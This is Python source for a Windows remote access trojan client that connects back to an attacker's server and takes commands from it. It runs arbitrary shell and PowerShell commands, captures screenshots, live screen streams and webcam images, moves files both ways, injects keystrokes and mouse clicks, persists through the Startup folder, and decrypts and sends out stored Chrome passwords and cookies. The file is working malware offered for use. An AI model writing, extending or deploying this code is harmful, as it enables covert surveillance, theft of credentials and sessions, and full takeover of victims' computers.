import ctypes# type: ignore
import sys# type: ignore
import socket# type: ignore
import os# type: ignore
import time# type: ignore
import pyautogui  # type: ignore # already imported
import cv2, numpy as np, struct, io# type: ignore
import subprocess# type: ignore
import shutil# type: ignore
import json# type: ignore
import win32crypt# type: ignore
import base64# type: ignore
import sqlite3# type: ignore
from Crypto.Cipher import AES  # type: ignore
from pynput.mouse import Controller, Button# type: ignore

mouse = Controller()

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("[!] Restarting script with Administrator privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

SERVER_IP = "REPLACE WITH THE IPv4 OF THE COMPUTER YOUR ATTACKING FROM"  # Automatically inserted
SERVER_PORT = 5555
OUTPUT_FILE = "command_output.txt"

def save_output_to_file(output):
    with open(OUTPUT_FILE, "a") as f:
        f.write(output + "\n")
    print(f"Output saved to {OUTPUT_FILE}")

def execute_command(command):
    try:
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        return str(e)

def send_data(sock, data: bytes):
    length = len(data)
    sock.sendall(length.to_bytes(8, byteorder='big'))
    sock.sendall(data)

def capture_and_send_screenshot(client):
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as f:
        screenshot_data = f.read()
    send_data(client, screenshot_data)
    return "[+] Screenshot sent to server."

def add_to_startup(file_path):
    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    os.system(f'copy "{file_path}" "{startup_folder}"')
    return "File added to startup."

def stream_screenshots(client):
    try:
        while True:
            cmd = client.recv(1)
            if cmd != b'S':
                break
            shot = pyautogui.screenshot()
            buf = io.BytesIO()
            shot.save(buf, format='JPEG')
            img_bytes = buf.getvalue()
            client.sendall(struct.pack('>I', len(img_bytes)))
            client.sendall(img_bytes)
    except:
        pass


def remove_from_startup(file_name):
    startup_folder = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
    file_path = os.path.join(startup_folder, file_name)
    if os.path.exists(file_path):
        os.remove(file_path)
        return "File removed from startup."
    return "File not found in startup."

def decrypt_chrome_data(encrypted_value):
    try:
        local_state_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State"
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        if encrypted_value.startswith(b'v10'):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]

            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_data = cipher.decrypt_and_verify(payload, tag)
            return decrypted_data.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception as e:
        return f"[!] Decryption error: {e}"


def get_chrome_passwords():
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    if not os.path.exists(chrome_path):
        return "[-] Chrome login database not found."
    try:
        temp_db = "LoginData_temp.db"
        shutil.copy2(chrome_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for url, username, encrypted_password in cursor.fetchall():
            try:
                decrypted_password = decrypt_chrome_data(encrypted_password)
                passwords.append(f"{url} - {username}: {decrypted_password}")
            except Exception as e:
                passwords.append(f"{url} - {username}: [Failed to decrypt: {e}]")
        conn.close()
        os.remove(temp_db)
        if passwords:
            return "\n".join(passwords)
        else:
            return "No passwords found."
    except Exception as e:
        return f"[-] Error grabbing passwords: {e}"

def get_chrome_cookies():
    chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Cookies"
    if not os.path.exists(chrome_path):
        return "[-] Chrome cookies file not found."
    try:
        temp_cookie_db = "Cookies_temp.db"
        shutil.copy2(chrome_path, temp_cookie_db)
        conn = sqlite3.connect(temp_cookie_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = []
        for host, name, encrypted_value in cursor.fetchall():
            try:
                decrypted_value = decrypt_chrome_data(encrypted_value)
                cookies.append(f"{host} - {name}: {decrypted_value}")
            except:
                cookies.append(f"{host} - {name}: [Failed to decrypt]")
        conn.close()
        os.remove(temp_cookie_db)
        return "\n".join(cookies) if cookies else "No cookies found."
    except Exception as e:
        return f"[-] Error grabbing cookies: {e}"

def execute_powershell(command):
    try:
        result = subprocess.check_output(["powershell", "-Command", command], shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except Exception as e:
        return str(e)

def show_help():
    help_text = """
    Available Commands:
    - screenshot                    : Capture the current screenshot.
    - cmd <command prompt>          : Run a system command and return the output.
    - webcam                        : Capture a webcam image.
    - asf <file_path>               : Add file to startup.
    - rsf <file_name>               : Remove file from startup.
    - movemouse <x> <y>             : Move mouse cursor to screen coordinate (x, y).
    - leftclick                     : Simulate a left mouse click.
    - ps <powershell command>       : Run powershell command
    - download                      : Download files from the clients system.
    - upload                        : Upload files to the clients system.
    - passwords                     : Retrieve and decrypt Chrome passwords.
    - cookies                       : Retrieve and decrypt Chrome cookies.
    - keytype <text>                : Simulate typing the given text.
    - enter                         : Simulate pressing the Enter key.
    - help                          : Show this help message.
    - exit                          : Close the connection.
    - Stream                        : Starts live stream of clients system (under progress, stuck at input() loop )
    - Stopstream                    : Stops live stream from clients system (under progress)

    Available Functions:
    - Triple Enter to reset terminal
    """
    return help_text


def recv_all(sock, length):
    data = b""
    while len(data) < length:
        more = sock.recv(length - len(data))
        if not more:
            raise EOFError("Socket closed before receiving all data")
        data += more
    return data

def capture_and_send_webcam(client):
    try:
        import cv2  # type: ignore
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("webcam_image.png", frame)
            cam.release()
            with open("webcam_image.png", "rb") as f:
                image_data = f.read()
            send_data(client, image_data)
            return "[+] Webcam image sent to server."
        cam.release()
        return "[-] Failed to capture image."
    except Exception as e:
        return f"[-] Webcam capture error: {e}"

def main():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))

            if not is_admin():
                client.send(b"[-] Error: This script must be run as Administrator.")

            while True:
                command = client.recv(1024).decode()

                if command == "screenshot":
                    response = capture_and_send_screenshot(client)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("cmd "):
                    output = execute_command(command[4:])
                    save_output_to_file(output)
                    send_data(client, output.encode())

                elif command.startswith("ps "):
                    ps_command = command[3:]
                    output = execute_powershell(ps_command)
                    save_output_to_file(output)
                    send_data(client, output.encode())

                elif command.startswith("download "):
                    file_path = command.split(" ", 1)[1]
                    try:
                        with open(file_path, "rb") as f:
                            file_data = f.read()
                        send_data(client, file_data)
                        response = f"[+] File '{file_path}' sent to server."
                    except Exception as e:
                        response = f"[-] Failed to send file: {e}"
                        send_data(client, b"")  
                    save_output_to_file(response)

                elif command.startswith("upload "):
                    file_path = command.split(" ", 1)[1]
                    try:
                        # Don't receive command again — it's already received
                        file_data_len_bytes = recv_all(client, 8)
                        file_size = int.from_bytes(file_data_len_bytes, "big")
                        file_content = recv_all(client, file_size)

                        with open(file_path, "wb") as f:
                            f.write(file_content)

                        response = f"[+] File received and saved to {file_path}"
                    except Exception as e:
                        response = f"[-] Failed to receive file: {e}"

                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "webcam":
                    response = capture_and_send_webcam(client)
                    save_output_to_file(response)
                    send_data(client, response.encode())  

                elif command.startswith("asf "):
                    file_path = command.split(" ", 1)[1]
                    response = add_to_startup(file_path)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("rsf "):
                    file_name = command.split(" ", 1)[1]
                    response = remove_from_startup(file_name)
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "passwords":
                    response = get_chrome_passwords()
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "cookies":
                    response = get_chrome_cookies()
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command.startswith("keytype "):
                    text = command[8:]
                    from pynput.keyboard import Controller as KeyboardController # type: ignore
                    keyboard = KeyboardController()
                    keyboard.type(text)
                    response = f"[+] Typed text: {text}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "enter":
                    try:
                        from pynput.keyboard import Controller as KeyboardController, Key # type: ignore
                        keyboard = KeyboardController()
                        keyboard.press(Key.enter)
                        keyboard.release(Key.enter)
                        response = "[+] Enter key pressed."
                    except Exception as e:
                        response = f"[-] Failed to press enter: {e}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "stream":
                    stream_screenshots(client) 

                elif command == "stopstream":
                    break  



                elif command.startswith("movemouse "):
                    try:
                        _, x_str, y_str = command.split()
                        x, y = int(x_str), int(y_str)
                        mouse.position = (x, y)
                        response = f"[+] Moved mouse to ({x}, {y})"
                    except Exception as e:
                        response = f"[-] Failed to move mouse: {e}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "leftclick":
                    try:
                        mouse.click(Button.left, 1)
                        response = "[+] Left mouse click executed."
                    except Exception as e:
                        response = f"[-] Failed to left click: {e}"
                    save_output_to_file(response)
                    send_data(client, response.encode())

                elif command == "help":
                    response = show_help()
                    send_data(client, response.encode())

                elif command == "exit":
                    client.close()
                    break

                else:
                    send_data(client, b"[-] Unknown command. Type 'help' for list.")

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        input(f"[!] Unhandled error: {e}\nPress Enter to exit...")
